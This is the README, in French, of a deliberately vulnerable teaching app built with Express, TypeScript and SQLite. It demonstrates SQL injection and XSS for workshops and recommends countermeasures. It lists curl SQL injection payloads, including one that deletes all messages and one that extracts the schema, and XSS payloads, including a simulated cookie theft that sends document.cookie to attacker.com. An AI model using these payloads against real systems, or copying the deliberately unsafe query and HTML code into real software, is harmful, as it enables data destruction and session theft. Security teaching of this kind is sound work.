# secu-form

Projet de démonstration pédagogique qui combine Express 5, TypeScript et SQLite pour illustrer deux vulnérabilités de sécurité majeures : **l'injection SQL** et le **Cross-Site Scripting (XSS)**. L'application contient intentionnellement ces vulnérabilités dans un environnement contrôlé pour permettre l'exploration, l'exploitation et l'apprentissage des bonnes pratiques de sécurité.

⚠️ **ATTENTION** : Ce code est volontairement vulnérable à des fins pédagogiques. Ne JAMAIS utiliser en production.

## Démarrage rapide

```bash
# Installer les dépendances
npm install

# Développement avec rechargement automatique
npm run dev

# Production
npm start

# Exécuter les tests
npm test

# Linter
npm run lint
```

Par défaut, le serveur HTTP écoute sur `http://localhost:3000`. Modifier le port avec `PORT=<numéro>`. SQLite persiste dans `./data/app.db` ; définir `SQLITE_DB_PATH=':memory:'` pour des exécutions éphémères.

## Interface web et API

### Page web principale (vulnérable au XSS)
Ouvrez `http://localhost:3000` dans un navigateur pour accéder à l'interface de messagerie. Testez les payloads XSS directement dans le formulaire :
- `<script>alert('XSS')</script>`
- `<img src=x onerror="alert('XSS')">`
- `<svg onload="alert('XSS')">`

### Documentation API (Swagger)
Interface Swagger UI disponible sur `http://localhost:3000/api-docs` pour explorer et tester l'API. Spécification OpenAPI complète : `/api-docs.json`

### Routes API

| Méthode | Route | Vulnérabilité | Description |
|---------|-------|---------------|-------------|
| `GET` | `/` | XSS | Page web principale avec rendu côté serveur non échappé |
| `POST` | `/` | XSS | Traite le formulaire de création de message |
| `GET` | `/messages` | Aucune | Liste sécurisée des messages (du plus récent au plus ancien) |
| `GET` | `/messages/:id` | SQL Injection | Récupère un message par ID (concaténation de chaînes) |
| `POST` | `/messages` | SQL Injection | Crée un message (concaténation de chaînes) |

## Démonstrations de vulnérabilités

### 1. Injection SQL

**Endpoints vulnérables** : `GET /messages/:id` et `POST /messages`

**Exemples d'exploitation** :

```bash
# DELETE injection - Supprime tous les messages
curl -X POST http://localhost:3000/messages \
  -H "Content-Type: application/json" \
  -d '{"body": "'\'''); DELETE FROM messages; --"}'

# Boolean-based - Contourne la clause WHERE
curl http://localhost:3000/messages/1%20OR%201=1

# UNION-based - Extraction du schéma de la base de données
curl http://localhost:3000/messages/1%20UNION%20SELECT%20name,%20sql,%20%272025%27%20FROM%20sqlite_master
```

**Code vulnérable** : `src/lib/database.ts` lignes 127 et 152
- Utilise la concaténation de chaînes : `INSERT INTO messages (body) VALUES ('${body}')`
- Au lieu de requêtes paramétrées sécurisées

### 2. Cross-Site Scripting (XSS)

**Endpoint vulnérable** : `GET /` (page web principale)

**Exemples d'exploitation** :

Accédez à `http://localhost:3000` et soumettez ces payloads dans le formulaire :

1. **Injection JavaScript directe**
   ```html
   <script>alert('XSS')</script>
   ```

2. **Événement onerror (contourne les filtres anti-script)**
   ```html
   <img src=x onerror="alert('XSS')">
   ```

3. **Balise SVG avec onload**
   ```html
   <svg onload="alert('XSS')">
   ```

4. **Vol de cookies simulé**
   ```html
   <img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
   ```

5. **Défacement de page**
   ```html
   <img src=x onerror="document.body.innerHTML='<h1>SITE COMPROMIS</h1>'">
   ```

**Code vulnérable** : `src/lib/app.ts` ligne 62
- Utilise l'interpolation sans échappement : `<div class="message-body">${msg.body}</div>`
- Le HTML est généré côté serveur sans sanitization

## Tests automatisés

Les tests démontrent et documentent chaque vulnérabilité :

- **`src/test/app.test.ts`** : Suite de tests d'injection SQL avec 9 scénarios d'exploitation commentés
- **`src/test/xss.test.ts`** : Suite de tests XSS avec 8 vecteurs d'attaque différents

Exécuter les tests :
```bash
npm test
```

Exécuter avec base de données isolée :
```bash
SQLITE_DB_PATH=':memory:' npm test
```

## Structure du projet

```
src/
├── lib/
│   ├── index.ts              # Bootstrap HTTP et configuration du serveur
│   ├── app.ts                # Application Express avec routes (vulnérable XSS)
│   ├── database.ts           # Connexion SQLite et helpers (vulnérable SQL)
│   ├── message-repository.ts # Pattern Repository avec versions vulnérable/sécurisée
│   └── swagger.ts            # Configuration OpenAPI/Swagger
├── test/
│   ├── app.test.ts           # Tests d'injection SQL
│   └── xss.test.ts           # Tests XSS
└── index.ts                  # Point d'entrée et réexports

data/                         # Base de données SQLite (par défaut)
dist/                         # Sortie TypeScript compilée
```

## Architecture de sécurité

### Pattern Repository

Le projet utilise deux implémentations du repository pour démontrer les différences :

- **`VulnerableMessageRepository`** : Utilise la concaténation de chaînes (vulnérable)
- **`SecureMessageRepository`** : Utilise des requêtes paramétrées (sécurisé)

### Fonction d'exécution centralisée

`executeParameterizedQuery(sql, params)` dans `database.ts` supporte les requêtes paramétrées, mais les helpers vulnérables passent des chaînes concaténées, contournant ainsi la sécurité.

## Conseils de développement

- **Rechargement automatique** : `npm run dev` pendant les ateliers
- **Tests unitaires** : Préférer les tests au niveau des gestionnaires plutôt que les sockets HTTP
- **État propre** : Utiliser `clearMessages()` dans les tests pour réinitialiser la base
- **Variables d'environnement** :
  - `PORT` : Port du serveur (défaut: 3000)
  - `SQLITE_DB_PATH` : Chemin de la base de données (défaut: `./data/app.db`)

## Contre-mesures recommandées

### Pour l'injection SQL
1. Utiliser des requêtes paramétrées : `db.prepare(sql).all(param1, param2)`
2. Valider et sanitizer toutes les entrées utilisateur
3. Appliquer le principe du moindre privilège pour les comptes de base de données
4. Utiliser des ORM avec protection intégrée

### Pour le XSS
1. Échapper le HTML : Convertir `<` en `&lt;`, `>` en `&gt;`, etc.
2. Utiliser `textContent` au lieu de `innerHTML` en JavaScript
3. Implémenter une Content Security Policy (CSP) stricte
4. Utiliser des bibliothèques de sanitization comme DOMPurify
5. Activer le flag `HttpOnly` sur les cookies sensibles

## Ressources pédagogiques

- **[CLAUDE.md](CLAUDE.md)** : Directives détaillées pour Claude Code
- **[AGENTS.md](AGENTS.md)** : Conventions de développement et architecture
- **Tests annotés** : Chaque test contient des explications détaillées des vulnérabilités

## Contribution

Pour les conventions de commit et les directives de pull request, voir [AGENTS.md](AGENTS.md).

## Licence

Ce projet est un outil pédagogique. Le code est fourni "tel quel" à des fins éducatives uniquement.